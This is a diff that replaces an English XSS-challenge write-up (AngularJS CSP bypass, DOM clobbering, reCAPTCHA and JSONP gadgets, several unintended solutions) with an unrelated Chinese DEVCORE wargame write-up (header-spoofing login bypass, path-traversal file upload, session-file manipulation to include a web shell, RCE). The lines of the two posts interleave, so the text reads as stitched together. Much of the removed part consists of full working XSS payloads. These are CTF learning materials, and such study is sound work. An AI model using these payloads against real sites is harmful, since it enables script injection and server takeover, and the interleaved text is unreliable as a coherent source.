@@ -1,204 +1,89 @@
-```
-https://www.google.com/recaptcha/../complete/search?client=chrome&q=https://cdnjs.cloudflare.com/ajax/libs/dompurify/..%252fangular.js/1.8.2/angular.js%23&callback=loadScript
-```
-
-Response:
+裡面可以直接看到幾個重要路徑：
 
 ```
-loadScript && loadScript(["https://cdnjs.cloudflare.com/ajax/libs/dompurify/..%2fangular.js/1.8.2/angular.js#",[],[],[],{"google:clientdata":{"bpc":false,"tlw":false},"google:suggesttype":[],"google:verbatimrelevance":1300}])
+/dev/sda /usr/share/nginx/frontend ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
+/dev/sda /usr/share/nginx/images ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
+/dev/sda /usr/share/nginx/b8ck3nd ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
+/dev/sda /usr/local/etc/php/php.ini ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
 ```
 
-### AngularJS CSP bypass
+沒錯，我一開始就漏掉了這個，就是因為這個卡了一整天 QQ
 
-Here comes the last part of the challenge. The goal is to find an AngularJS CSP bypass and XSS without user interaction.
+找到這個之後就變得容易了起來，進到 `b8ck3nd/index.php` 的時候直接被導回首頁，想起之前在 `include.php` 看到的一些 utils funtion，試著加入 `X-Forwarded-For: 127.0.0.1` 就可以 bypass，導去登入頁面，登入帳密就用之前 SQL injection 打出來的那組，登入成功後就順利拿到第四個 flag。
 
-There is a classic payload as described in:
+![](/img/devcore-wargame/p2.png)
 
-1. [Bypassing path restriction on whitelisted CDNs to circumvent CSP protections - SECT CTF Web 400 writeup](https://blog.0daylabs.com/2016/09/09/bypassing-csp/)
-2. [H5SC Minichallenge 3: "Sh*t, it's CSP!"](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22)
+接著可以在 backend 找到一個 upload.php，可以上傳任意檔案：
 
-``` html
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/..%252fprototype/1.7.2/prototype.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/..%252fangular.js/1.0.1/angular.js"></script>
-<div ng-app ng-csp>
+``` php
+<?php
 
-｛{$on.curry.call().alert(1)}}
+require_once('include.php');
 
-</div>
-```
+if ($_SERVER['REQUEST_METHOD'] == 'GET') {
+    header('Content-Type: text/plain');
+    echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkZha2UgdG9rZW4gZm9yIGNrZWRpdG9yIiwiaWF0IjoxNTE2MjM5MDIyfQ.6nNLxp10uP65V_NFrs5IWuX2tkk6vGQ-oiwYhHNdHgk';
+    exit();
+}
 
-It requires no user interaction, perfect! But there are two other issues we need to address.
-
-First, `ng-app` and `ng-csp` will be removed by DOMPurify. Second, there is no `prototype.js`.
-
-For the first issue, we can use `data-ng-app` and `data-ng-csp` instead of `ng-app` and `ng-csp`, because AngularJS will [normalize](https://github.com/angular/angular.js/blob/9bff2ce8fb170d7a33d3ad551922d7e23e9f82fc/src/ng/compile.js#L4247) attribute names, and remove `x-` and `data-` prefixes.
-
-For the second issue, we need to know why prototype.js is needed.
-
-It's needed because prototype.js [adds a few methods](https://github.com/prototypejs/prototype/blob/master/src/prototype/lang/function.js#L226) to different prototype, like `Function.prototype`:
-
-``` js
-function curry() {
-  if (!arguments.length) return this;
-  var __method = this, args = slice.call(arguments, 0);
-  return function() {
-    var a = merge(args, arguments);
-    return __method.apply(this, a);
-  }
+if (isset($_FILES['file']) && is_uploaded_file($_FILES['file']['tmp_name'])) {
+    header('Content-Type: application/json; charset=utf-8');
+    $ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
+    $filename = random_str(32).'.'.$ext;
+    if (isset($_POST['rename'])) {
+        $filename = $_POST['rename'];
+    }
+    if (isset($_POST['folder'])) {
+        $folder = $_POST['folder'];
+        if (!file_exists(IMAGE_PATH.$folder)) {
+            mkdir(IMAGE_PATH.$folder);
+        }
+        $filename = $folder.'/'.$filename;
+    }
+    $filepath = IMAGE_PATH . $filename;
+    move_uploaded_file($_FILES['file']['tmp_name'], $filepath);
+    system("rsync_wrap ".escapeshellarg($filepath));
+    $id = base64_urlsafe_encode($filename);
+    echo json_encode([
+        'default' => '/image.php?id='.$id
+    ]);
+} else {
+    http_response_code(400);
 }
 ```
 
-The first argument of `fn.call()` is `this`, if you call this function without providing `this`, the default value of `this` is `window` in non-strict mode.
+先試著上傳到 `../../../../../usr/share/nginx/frontend` 看看，就得到了第五組 flag：
 
-So, `any_function.curry.call()` will return `this` which is `window`, that's why we need prototype.js.
+![](/img/devcore-wargame/p3.png)
 
-If you look at the source code again, you can find a similar pattern:
+但實際試了一下發現檔案其實沒寫進去，也嘗試了其他路徑，例如說 `b8ck3nd`，或我有想說會不會是要寫進去 `/usr/share/nginx/frontend/third_party/vendor` 然後搭配前面提到的 mpdf 觸發 phar 漏洞（感覺滿合理的），但這邊也寫不進去。
 
-``` js
-String.prototype.encode = function(type) {
-  if (!type) return this
-  if (type === 'uri') return encodeURIComponent(this)
-  if (type === 'json') return JSON.stringify(this)
-  if (type === 'base64') return atob(this)
-}
-```
+或是寫進 `langs` 裡面搭配切換語系來引入檔案，但這邊也寫不進去。
 
-That is to say, we can get `window` via `"any_string".encode.call()`.
+想了一陣子之後嘗試寫到 `/tmp`，這邊倒是沒問題，於是答案就很明顯了，先寫一個檔案 `/tmp/test1234.php`，然後再寫一個 `/tmp/sess_abc`，因為可以操控 session 檔案內容，於是就可以自己填入想要的 lang，操控 `$_SESSION['lang']` 的值，搭配最開始提到的 `include.php` 引入自己寫的 web shell，就可以 RCE 了。
 
-### Piece all together
+RCE 以後就可以在根目錄執行 `/readflag` 讀到 flag。
 
-The full exploit including:
+於是六把 flag 我獨缺第二把，其他都完成了，但最後那把到底在哪裡？我拿到 shell 之後有去裡面稍微翻了一下，原本猜說可能是在 nginx config 裡面，但怎麼找都沒找到（話說即使玩到最後我都沒找到 nginx config 在哪）。
 
-1. DOM clobbering `window.defaultOptions.allowDOM` to allow clobber document
-2. DOM clobbering `document.scripts['undefined']`
-3. Call `loadData` via reCAPTCHA
-4. Call `reloadRecaptchaScript` via reCAPTCHA
-5. Load AngularJS from cdn.js by classic google gadget and `..%2f` trick 
-6. Use `data-ng-app` instead of `ng-app` to bypass DOMPurify
-7. Use `"".encode.call()` to get window object
+又過了大概半小時，flag 出現的順序應該會跟解題的順序跟難易度差不多，既然第一把是 Path Traversal，第三把是 SQL injection，就代表第二把應該是出現在兩個中間才對，於是我突然有了個想法，心裡想著「不會吧...」
 
-Here is the final payload for the intended solution:
+然後前往 http://web.ctf.devcore.tw/order.php?id=1&sig[]=1
 
-[link](https://aszx87410.github.io/xss-challenge/notes/?name=&content=%3Cdiv%3E%0A%20%20%3Cform%3E%3C%2Fform%3E%0A%20%20%3Cform%20name%3D%22scripts%22%3E%0A%20%20%20%20%3Cimg%20name%3D%22undefined%22%20src%3D%22https%3A%2F%2Fwww.google.com%2Frecaptcha%2F..%2Fcomplete%2Fsearch%3Fclient%3Dchrome%26q%3Dhttps%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Fdompurify%2F..%25252fangular.js%2F1.8.2%2Fangular.js%2523%26callback%3DloadScript%22%3E%0A%20%20%3C%2Fform%3E%0A%20%20%3Cform%20id%3DdefaultOptions%3E%0A%20%20%20%20%3Cimg%20name%3DallowDOM%3E%0A%20%20%3C%2Fform%3E%0A%20%20%20%20%3Cdiv%20class%3D%22g-recaptcha%22%20data-sitekey%3D%22AAA%22%20data-error-callback%3D%22reloadRecaptchaScript%22%20data-size%3D%22invisible%22%3E%3C%2Fdiv%3E%0A%20%20%3Cdiv%20class%3D%22g-recaptcha%22%20data-sitekey%3D%22B%22%20data-error-callback%3D%22loadData%22%20data-size%3D%22invisible%22%3E%3C%2Fdiv%3E%0A%20%20%0A%20%20%3Cdiv%20data-ng-app%20data-ng-csp%3E%0A%20%20%20%20%7B%7B%20%22abc%22.encode.call().alert(%22abc%22.encode.call().document.domain)%20%7D%7D%0A%20%20%3C%2Fdiv%3E%0A%3C%2Fdiv%3E)
+第二把 flag 就這樣出現在我眼前了
 
-``` html
-<div>
-  <form></form>
-  <form name="scripts">
-    <img name="undefined" src="https://www.google.com/recaptcha/../complete/search?client=chrome&q=https://cdnjs.cloudflare.com/ajax/libs/dompurify/..%252fangular.js/1.8.2/angular.js%23&callback=loadScript">
-  </form>
-  <form id=defaultOptions>
-    <img name=allowDOM>
-  </form>
-    <div class="g-recaptcha" data-sitekey="AAA" data-error-callback="reloadRecaptchaScript" data-size="invisible"></div>
-  <div class="g-recaptcha" data-sitekey="B" data-error-callback="loadData" data-size="invisible"></div>
-  
-  <div data-ng-app data-ng-csp>
-    [["abc".encode.call().alert("abc".encode.call().document.domain)]]
-  </div>
-</div>
-```
+![](/img/devcore-wargame/p4.png)
 
-Note: somehow hexo throw error if I used `}{`, so I changed to `[[]]`
+## 總結
 
-## Unintended
+最後來檢討一下這次碰到的問題。
 
-Besides the intended solution, there are 4 amazing unintended solutions.
+第一個最嚴重的問題就是讀檔那邊沒有找到關鍵檔案，導致後續整個卡死。
 
-### Unintended #1 by @maple3142
+以後碰到這種可以讀本地檔案的漏洞，應該要自己建個字典檔，不然每次都要 google 半天有哪些可以讀，之後來寫一篇整理一下好了。
 
-At first, I didn't know there was a `jsonp` argument in `https://www.google.com/complete/search` endpoint, so there was no check for `jsonp`.
+第二個問題是沒注意到第二把 flag，其實 sql injection 的時候如果該拿的資料都有拿完，應該也是看得到，所以以後記得可以把 db 整個 dump 出來。
 
-It's east to get a XSS by loading something like `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(document.domain)//`
+總之我覺得還是滿好玩的，感謝 DEVCORE 的 wargame，而最後也因為挑戰時間有延長一點，順利拿到了 DEVCORE 發的挑戰者 NFT！
 
-Later on, I implemented a [check](https://github.com/aszx87410/xss-challenge/commit/26322b72a3c45aa1751d46253455a64d94d051d8) for `jsonp` in `reloadRecaptchaScript`:
-
-``` js
-if (src.includes('jsonp') || decodeURIComponent(src).includes('jsonp')) {
-  throw new Error('dangerous keyword detected')
-}
-```
-
-### Unintended #2 by @smaury92
-
-It turns out that I implemented a flawed check, can you spot the bug?
-
-You can bypass the check by open redirect and double encoded the `https://google.com/complete/search` call, like this:
-
-``` js
-reloadRecaptchaScript('https://www.google.com/recaptcha/../url?q=https://www.google.com/complete/search?client=chrome%26q=%25%36%38%25%37%34%25%37%34%25%37%30%25%37%33%25%33%61%25%32%66%25%32%66%25%37%37%25%37%37%25%37%37%25%32%65%25%36%37%25%36%66%25%36%66%25%36%37%25%36%63%25%36%35%25%32%65%25%36%33%25%36%66%25%36%64%25%32%66%25%36%33%25%36%66%25%36%64%25%37%30%25%36%63%25%36%35%25%37%34%25%36%35%25%32%66%25%37%33%25%36%35%25%36%31%25%37%32%25%36%33%25%36%38%25%33%66%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%33%64%25%36%33%25%36%38%25%37%32%25%36%66%25%36%64%25%36%35%25%32%36%25%36%61%25%37%33%25%36%66%25%36%65%25%37%30%25%33%64%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34%25%32%38%25%36%34%25%36%66%25%36%33%25%37%35%25%36%64%25%36%35%25%36%65%25%37%34%25%32%65%25%36%34%25%36%66%25%36%64%25%36%31%25%36%39%25%36%65%25%32%39%25%32%66%25%32%66%2523%26callback=loadScript%231')
-```
-
-So it passed the check for `reloadRecaptchaScript`.
-
-I decided the move the check from `reloadRecaptchaScript` to `loadScript`: https://github.com/aszx87410/xss-challenge/commit/7382e9b48721b1dd9edcd21675e1e7f56d171c2c
-
-### Unintended #3 by @lbrnli1234
-
-The check failed again.
-
-payload:
-
-``` js
-reloadRecaptchaScript('https://www.google.com/recaptcha/../url?q=https%3A%2F%2Fwww.google.com%2Fcomplete%2Fsearch%3Fclient%3Dhp%26q%3Da%26%256asonp%3Dalert(document.domain)')
-```
-
-I was aware of google open redirect but I didn't notice a subtle difference. When I tried google open redirect, it returned 200 in that case and used client side redirect: https://www.google.com/url?q=https%3A%2F%2Ftech-blog.cymetrics.io&sa=D&sntz=1&usg=AFQjCNHyq6urHn6HLwj8RP09GANAlymZug
-
-So I thought it was impossible to leverage this open redirect.
-
-But for some other cases, it returns 302: https://www.google.com/url?sa=t&url=http://example.org/&usg=AOvVaw1YigBkNF7L7D2x2Fl532mA
-
-Anyway, I didn't fix this unintended in the end because I don't have a good solution at the moment.
-
-### Unintended #4 by @lbrnli1234
-
-Another dope unintended has been found:
-
-``` js
-https://aszx87410.github.io/xss-challenge/notes/?name=&content=<p class=g-recaptcha data-sitekey=x data-error-callback=reloadRecaptchaScript></p>
-<p class=g-recaptcha data-sitekey=x data-error-callback=reloadRecaptchaScript></p>
-<p class=g-recaptcha data-sitekey=x data-error-callback=loadData></p>
-<form></form>
-<form id=defaultOptions><img id=allowDOM></form>
-<form name=scripts>
-<input id=undefined src='https://www.google.com/recaptcha/../complete/search?client=hp&q=https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.0/purify.min.js%23&callback=loadScript'>
-<img id=undefined src='https://www.google.com/recaptcha/../jsapi?callback=loadData'>
-</form>
-<form><math><mtext></form><form><mglyph><style></math><iframe srcdoc='
-&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x20;&#x73;&#x72;&#x63;&#x3d;&#x22;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x63;&#x64;&#x6e;&#x6a;&#x73;&#x2e;&#x63;&#x6c;&#x6f;&#x75;&#x64;&#x66;&#x6c;&#x61;&#x72;&#x65;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#x61;&#x6a;&#x61;&#x78;&#x2f;&#x6c;&#x69;&#x62;&#x73;&#x2f;&#x64;&#x6f;&#x6d;&#x70;&#x75;&#x72;&#x69;&#x66;&#x79;&#x2f;&#x2e;&#x2e;&#x25;&#x32;&#x66;&#x70;&#x72;&#x6f;&#x74;&#x6f;&#x74;&#x79;&#x70;&#x65;&#x2f;&#x31;&#x2e;&#x37;&#x2e;&#x32;&#x2f;&#x70;&#x72;&#x6f;&#x74;&#x6f;&#x74;&#x79;&#x70;&#x65;&#x2e;&#x6a;&#x73;&#x22;&#x3e;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#xa;&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x20;&#x73;&#x72;&#x63;&#x3d;&#x22;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x63;&#x64;&#x6e;&#x6a;&#x73;&#x2e;&#x63;&#x6c;&#x6f;&#x75;&#x64;&#x66;&#x6c;&#x61;&#x72;&#x65;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#x61;&#x6a;&#x61;&#x78;&#x2f;&#x6c;&#x69;&#x62;&#x73;&#x2f;&#x64;&#x6f;&#x6d;&#x70;&#x75;&#x72;&#x69;&#x66;&#x79;&#x2f;&#x2e;&#x2e;&#x25;&#x32;&#x66;&#x61;&#x6e;&#x67;&#x75;&#x6c;&#x61;&#x72;&#x2e;&#x6a;&#x73;&#x2f;&#x31;&#x2e;&#x30;&#x2e;&#x31;&#x2f;&#x61;&#x6e;&#x67;&#x75;&#x6c;&#x61;&#x72;&#x2e;&#x6a;&#x73;&#x22;&#x3e;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#xa;&#x3c;&#x64;&#x69;&#x76;&#x20;&#x6e;&#x67;&#x2d;&#x61;&#x70;&#x70;&#x20;&#x6e;&#x67;&#x2d;&#x63;&#x73;&#x70;&#x3e;&#x7b;&#x7b;&#x24;&#x6f;&#x6e;&#x2e;&#x63;&#x75;&#x72;&#x72;&#x79;&#x2e;&#x63;&#x61;&#x6c;&#x6c;&#x28;&#x29;&#x2e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x24;&#x6f;&#x6e;&#x2e;&#x63;&#x75;&#x72;&#x72;&#x79;&#x2e;&#x63;&#x61;&#x6c;&#x6c;&#x28;&#x29;&#x2e;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x64;&#x6f;&#x6d;&#x61;&#x69;&#x6e;&#x29;&#x7d;&#x7d;&#x3c;&#x2f;&#x64;&#x69;&#x76;&#x3e;
-'></iframe>
-```
-
-The content of `srcdoc` is the classic angularJS CSP bypass payload we mentioned
-
-``` html
-<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/..%2fprototype/1.7.2/prototype.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/..%2fangular.js/1.0.1/angular.js"></script>
-<div ng-app ng-csp>｛{$on.curry.call().alert($on.curry.call().document.domain)}}</div>
-```
-
-The flow is like:
-
-1. reCAPTCHA triggers `reloadRecaptchaScript()`, will be run after 1s
-2. reCAPTCHA triggers `reloadRecaptchaScript()`, will be run after 1s
-3. reCAPTCHA triggers `loadData()`, run immediately and pollute `document.scripts['undefined']`
-4. Run the function in step 1, load src from `<input>`, call `loadScript('https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.0/purify.min.js')`
-5. Run the function in step 2, load src from `<img>`, call `loadScript('https://www.google.com/recaptcha/../jsapi?callback=loadData')` to trigger `loadData` again
-6. Old version of DOMPurify has loaded (the lib we load in step 4), override latest one
-7. Script at step 5 also loaded, `loadData` has been called again
-8. Now, the DOMPurify is the old and flawed version, so we can bypass it easily
-
-It sometimes fails because of race conditions.
-
-For example, if script at step 5 is loaded(called `loadDate`) before DOMPurify, we still use the latest version, so there is no way to bypass it.
-
-The author created an HTML page and embedded a few `<iframe>` to load the URL many times to solve the issue. 
-
-## Takeaways
-
-1. Everything can be abuse
-2. Existing JS code might be helpful sometimes
-3. Knowing the default behavior of third party libraries is helpful
-
-I hope you did learn something new and enjoyed this challenge, thanks for playing the game!
+![](/img/devcore-wargame/p5.png)
